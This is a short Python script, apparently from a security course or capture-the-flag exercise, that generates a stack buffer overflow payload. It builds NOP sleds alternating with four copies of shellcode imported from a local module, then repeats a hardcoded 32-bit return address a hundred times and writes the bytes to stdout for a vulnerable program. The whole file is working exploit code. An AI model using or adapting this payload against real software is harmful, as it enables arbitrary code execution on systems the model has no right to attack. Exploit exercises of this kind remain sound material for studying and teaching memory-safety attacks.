import sys, struct
from shellcode import shellcode

RET = 0xfffec6c0

p1 = 256 -len(shellcode)

sys.stdout.buffer.write(b"\x90" * p1 + shellcode + b"\x90" * p1 + shellcode + b"\x90" * p1 + shellcode + b"\x90" * p1 + shellcode+ struct.pack("<I", RET)*100)



